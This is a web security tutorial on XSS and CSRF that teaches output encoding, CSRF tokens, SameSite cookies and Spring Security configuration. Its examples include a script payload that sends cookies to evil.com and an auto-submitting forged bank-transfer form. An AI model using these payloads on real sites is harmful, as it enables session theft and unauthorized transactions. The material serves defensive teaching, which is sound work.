


## The problem these two solve

Your browser trusts websites, and websites trust your browser. Both attacks abuse one of those two kinds of trust.

||**XSS** (Cross-Site Scripting)|**CSRF** (Cross-Site Request Forgery)|
|---|---|---|
|What the attacker gets|_Their code_ running inside _your_ page|_Your browser_ sending a request you never meant to send|
|Whose trust is abused|The browser's trust in the site|The site's trust in the browser (its cookies)|
|One-line picture|Someone writes on your whiteboard, and everyone trusts what's written there|Someone forges your signature using your own pen|

I'll teach them one at a time, then show how they connect.

---

# Part 1: XSS (Cross-Site Scripting)

## What it is

XSS happens when your site takes text from a user and puts it into a page **without making it safe first**. The browser can't tell which parts of the page _you_ wrote and which parts an attacker wrote. It runs all of it.

This is the same "mixing data with code" mistake behind SQL injection. The difference is that the victim here is the browser, not the database.

## A vulnerable example

Here is a Spring Boot search page:

```java
@GetMapping("/search")
@ResponseBody
public String search(@RequestParam String q) {
    return "<h1>Results for " + q + "</h1>";
}
```

Line by line:

- `@GetMapping("/search")` handles requests like `/search?q=shoes`.
- `@ResponseBody` means the returned string is sent directly to the browser as the page.
- `@RequestParam String q` reads the `q` value from the URL.
- The `return` line glues `q` straight into HTML. This is the bug.

For `?q=shoes`, the page shows "Results for shoes". But an attacker sends a victim this link:

```
/search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

The server builds this page:

```html
<h1>Results for <script>fetch('https://evil.com/steal?c='+document.cookie)</script></h1>
```

The browser sees a `<script>` tag and runs it. It runs **as your site**, with full access to the page, so the victim's cookies go to `evil.com`.

## What an attacker can do with XSS

Once their script runs on your page, it is _you_ as far as the browser is concerned. It can:

- Read cookies that lack `HttpOnly`, plus `localStorage` and `sessionStorage`.
- Send requests to your API as the logged-in user, such as changing an email or transferring money.
- Rewrite the page, for example showing a fake login form that sends passwords to the attacker.
- Log keystrokes.

## The three types

|Type|Where the bad input lives|Example|
|---|---|---|
|**Reflected**|In the request (usually the URL) and echoed straight back|The `/search?q=` example above. The victim must click a crafted link.|
|**Stored**|Saved in your database, then shown to everyone|A comment containing `<script>`. Every visitor who views it is hit. This is the most dangerous type.|
|**DOM-based**|Never touches the server. The page's own JavaScript misuses it|`element.innerHTML = location.hash`|

The Samy worm I mentioned in the history lesson was stored XSS.

## How to defend: the core idea

The principle is **treat user input as text, never as code**. You do that by **encoding output**, meaning you convert special characters into harmless versions when you put them into a page:

|Character|Becomes|
|---|---|
|`<`|`&lt;`|
|`>`|`&gt;`|
|`"`|`&quot;`|
|`&`|`&amp;`|

After encoding, `<script>` shows up on screen as the _text_ `<script>`, and the browser doesn't run it.

### Defense 1: Use a template engine that encodes automatically

In Thymeleaf (common with Spring Boot):

```html
<p th:text="${comment}"></p>    <!-- SAFE: encodes automatically -->
<p th:utext="${comment}"></p>   <!-- DANGEROUS: "unescaped text", no encoding -->
```

- `th:text` puts the value in as plain text and escapes it.
- `th:utext` puts it in as raw HTML. Only use it for content you fully trust.

If you must return strings manually, as in the vulnerable example, encode them:

```java
import org.springframework.web.util.HtmlUtils;

return "<h1>Results for " + HtmlUtils.htmlEscape(q) + "</h1>";
```

`HtmlUtils.htmlEscape(q)` converts the dangerous characters, so the attacker's script becomes visible text.

### Defense 2: In JavaScript, avoid the dangerous sinks

A **sink** is a place where data becomes code or HTML.

```javascript
el.innerHTML = userInput;     // DANGEROUS: parses HTML
el.textContent = userInput;   // SAFE: always plain text
```

Frameworks like React and Angular escape by default. React's `dangerouslySetInnerHTML` has that name as a warning for the same reason.

### Defense 3: Encode for the right context

Where you put the data changes what "safe" means:

|Where the data goes|Danger|What you need|
|---|---|---|
|Between tags: `<p>HERE</p>`|`<script>`|HTML encoding|
|In an attribute: `<input value="HERE">`|A `"` that closes the attribute and adds `onclick=...`|Attribute encoding, and always use quotes|
|Inside a `<script>` block|Breaking out of a string|Avoid it. Pass data via JSON or `data-` attributes instead.|
|In a URL: `<a href="HERE">`|`javascript:alert(1)`|Allow only `http` and `https`|

Template engines handle most of this, but only for the contexts they know about.

### Defense 4: Sanitize when you truly need HTML

If users may write rich text, like a blog editor, encoding would destroy their formatting. Use a sanitizer library that keeps safe tags (`<b>`, `<p>`) and removes the rest. In Java, the **OWASP Java HTML Sanitizer** is a good choice. Don't write your own with regex. Attackers are creative, and regex loses.

### Defense 5: The safety nets

If something slips past, these limit the damage:

- **CSP** blocks scripts you didn't approve, so injected scripts often can't run.
- **`HttpOnly` cookies** can't be read by JavaScript, so session theft fails.

A safety net is not a replacement for encoding. Encode first, and keep the nets as backup.

---

# Part 2: CSRF (Cross-Site Request Forgery)

## The problem it solves

Browsers have a convenient habit: **when you send a request to a site, the browser automatically attaches that site's cookies.** It does this _no matter which page_ triggered the request.

That means a page on `evil.com` can make your browser send a request to `bank.com`, and your `bank.com` session cookie goes along for the ride. The bank sees a valid cookie and thinks _you_ made the request.

## A step-by-step attack

Imagine your bank has this endpoint:

```
POST /transfer     body: to=alice&amount=100
```

1. You log in to `bank.com`. Your browser stores the session cookie.
2. In another tab, you visit `evil.com`, maybe through a link in an email.
3. The page on `evil.com` contains this:

```html
<form action="https://bank.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.getElementById('f').submit();</script>
```

Line by line:

- The `<form>` points at the bank's real transfer URL.
- The two hidden inputs fill in the attacker's chosen values. You never see them.
- The script submits the form the moment the page loads.

4. Your browser sends the POST to `bank.com` **with your cookie attached**.
5. The bank sees a logged-in user making a transfer and approves it.

Notice what the attacker _didn't_ do: they never saw your cookie, and they never read the response. CSRF only needs the request to be **sent**. That's why it targets actions that change things (transfers, password changes, deleting data), not actions that read things.

## When CSRF is possible

All three of these must be true:

|Condition|Meaning|
|---|---|
|A useful action exists|Something that changes state, like "change email"|
|Cookie-based authentication|The browser adds the credential automatically|
|No unpredictable value in the request|The attacker can guess everything needed to build the request|

Defenses work by breaking one of these. The third is usually the easiest to break.

## How to defend

### Defense 1: CSRF tokens (the classic fix)

The server gives each user session a **random secret token** and requires it with every state-changing request. The attacker can _force_ the browser to send cookies, but they can't _read_ the token, because the same-origin policy blocks their page from reading your site.

```html
<form method="POST" action="/transfer">
  <input type="hidden" name="_csrf" value="9f2c71e0-...random...">
  <input name="to"> <input name="amount">
  <button>Send</button>
</form>
```

The flow:

1. The server renders the form with a fresh token inside.
2. You submit it. The browser sends the cookie **and** the token.
3. The server checks that the token matches the one it issued for your session.
4. The forged request from `evil.com` has no valid token, so it's rejected.

**Spring Security does this for you.** CSRF protection is **on by default**, and Thymeleaf adds the hidden `_csrf` field automatically in forms that use `th:action`. For a JavaScript front end using cookies, you can expose the token like this:

```java
http.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()));
```

- `.csrf(...)` configures CSRF protection.
- `CookieCsrfTokenRepository` stores the token in a cookie named `XSRF-TOKEN`.
- `withHttpOnlyFalse()` lets your JavaScript read that cookie and copy its value into an `X-XSRF-TOKEN` header on each request. This is safe here because the attacker's site still can't read _your_ site's cookies.

(Spring Security 6 needs a little extra handler configuration for single-page apps. The reference docs have a recipe called "Single-Page Applications".)

You may see tutorials that write `http.csrf(csrf -> csrf.disable())`. That is only reasonable for a **stateless API** that authenticates with a token in an `Authorization` header, not cookies. Without automatic cookies, condition 2 above is gone. If your app uses cookie sessions, don't disable it.

### Defense 2: SameSite cookies

```
set-cookie: session=abc; SameSite=Lax; Secure; HttpOnly
```

This tells the browser not to attach the cookie to most requests started by _other_ sites.

|Value|Behavior|
|---|---|
|`Strict`|Cookie is never sent on cross-site requests. Safest, but even clicking a link to your site from elsewhere arrives logged-out.|
|`Lax`|Sent on top-level navigations that are safe (a normal link click), but **not** on cross-site POSTs or background requests. This is the default in modern browsers.|
|`None`|Always sent (requires `Secure`). Needed for some embedded or third-party cases.|

`Lax` blocks the form attack above. But treat it as a strong extra layer, not your only defense. It treats "site" more loosely than "origin" (`a.example.com` and `b.example.com` count as the same site), and older browsers and edge cases behave differently.

### Defense 3: Never change state with GET

If `GET /deleteAccount` works, an attacker needs only `<img src="https://bank.com/deleteAccount">` and the browser fires it automatically. Use `POST`, `PUT`, or `DELETE` for anything that changes data. `Lax` cookies and Spring's CSRF checks both rely on this convention.

### Defense 4: Check Origin or Referer

Browsers send an `Origin` header on cross-site POSTs naming the page that started the request. The server can reject any value that isn't its own site. It's a good extra check, but it's not a complete defense by itself.

---

# Part 3: How they connect

## The key difference

|Question|XSS|CSRF|
|---|---|---|
|Does the attacker run code **on your site**?|Yes|No, it runs on their own site|
|Can the attacker **read** responses?|Yes, since they're inside the page|No, they can only send blind requests|
|Main cause|Unencoded output|Cookies sent automatically with no check|
|Main fix|Output encoding, plus CSP|CSRF tokens, plus SameSite|
|Does a CSRF token help?|No|Yes|
|Does `HttpOnly` help?|Partly (protects the cookie, not the actions)|No|

## Why XSS beats CSRF protection

An XSS script runs on your real page, so it can read the CSRF token and include it in its requests. **If your site has XSS, CSRF tokens don't save you.** That's why fixing XSS comes first, and why the two are taught together.

## Two related concepts, briefly

**Clickjacking:** the attacker loads your real page in an invisible `<iframe>` and tricks you into clicking a button on it. It's like CSRF, but it uses your real clicks. Fix it with `X-Frame-Options: DENY` or CSP `frame-ancestors`, which you saw in the last lesson.

**CORS is not a CSRF defense:** a common mix-up. CORS controls whether a page can **read** a cross-origin response. CSRF works by **sending** a request, and a simple form POST goes out regardless of CORS. Don't rely on CORS settings to stop forged requests.

---

# Try it yourself

**1. See XSS being blocked (safe, on your own machine):**  
Run a small Spring Boot app with the vulnerable `/search` endpoint. Visit `/search?q=<b>hello</b>` and notice the text turns bold, which proves your input became HTML. Then add `HtmlUtils.htmlEscape` and reload. You'll see the literal `<b>hello</b>` text instead.

**2. Watch CSRF protection in the Network tab:**  
Run a Spring Boot app with Spring Security and a Thymeleaf form. Submit it and open the **Network** tab. Click the POST request, then **Payload**, and you'll see `_csrf` in the form data. Now use `curl` to send the same POST without the token:

```bash
curl -i -X POST http://localhost:8080/transfer -d "to=alice&amount=100"
```

You'll get a `403 Forbidden`, which is the CSRF check doing its job.

**3. Inspect cookies:**  
In **Application → Cookies**, find your session cookie. Check that `HttpOnly`, `Secure`, and `SameSite` are set. Then type `document.cookie` in the **Console**. A properly flagged session cookie won't appear in the output.

---

# Quick checklist

**For XSS:**

- Use `th:text`, not `th:utext`.
- Use `textContent`, not `innerHTML`.
- Sanitize with a library if users submit HTML.
- Add a CSP and `HttpOnly` cookies as backup.

**For CSRF:**

- Keep Spring Security's CSRF protection on for cookie-based apps.
- Use `SameSite=Lax` or `Strict`.
- Never change state with GET.
- Only disable CSRF for truly stateless, header-token APIs.





[[Spring Security]]